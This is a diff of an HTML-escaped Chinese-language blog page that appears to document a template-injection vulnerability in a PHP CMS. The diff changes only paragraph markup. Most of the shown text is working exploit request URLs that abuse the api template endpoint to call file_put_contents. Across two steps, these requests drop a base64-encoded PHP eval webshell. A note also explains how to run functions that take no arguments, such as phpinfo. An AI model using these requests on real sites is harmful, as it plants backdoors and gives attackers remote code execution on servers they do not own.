@@ -36,10 +36,10 @@
 &lt;p&gt;&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=&amp;lt;&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;2.写剩余的语句:&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?=&#39;&#39;;file_put_contents(&#39;webshell.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg==&#39;));%20param2=FILE_APPEND&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;1.写入php标记为&lt;code&gt;&amp;lt;?php ?&amp;gt;&lt;/code&gt;的php文件,先写&lt;code&gt;&amp;lt;&lt;/code&gt;:
-&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=&amp;lt;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;2.写剩余的语句:
-&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?php%0dfile_put_contents(&#39;webshell.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg==&#39;));%20param2=FILE_APPEND&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;1.写入php标记为&lt;code&gt;&amp;lt;?php ?&amp;gt;&lt;/code&gt;的php文件,先写&lt;code&gt;&amp;lt;&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=&amp;lt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;2.写剩余的语句:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/index.php?s=api&amp;amp;c=api&amp;amp;m=template&amp;amp;app=admin&amp;amp;name=api_related.html&amp;amp;phpcmf_dir=admin&amp;amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?php%0dfile_put_contents(&#39;webshell.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg==&#39;));%20param2=FILE_APPEND&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;写完之后,访问执行webshell2.php,会在同目录下生成webshell.php文件,webshell.php即为webshell&lt;/p&gt;
 &lt;h2 id=&#34;执行无参函数&#34;&gt;执行无参函数&lt;/h2&gt;
 &lt;p&gt;如果想执行无参函数,例如&lt;code&gt;phpinfo();&lt;/code&gt;,将url中的&lt;code&gt;param0&lt;/code&gt;参数设为&lt;code&gt;-1&lt;/code&gt;即可:&lt;/p&gt;
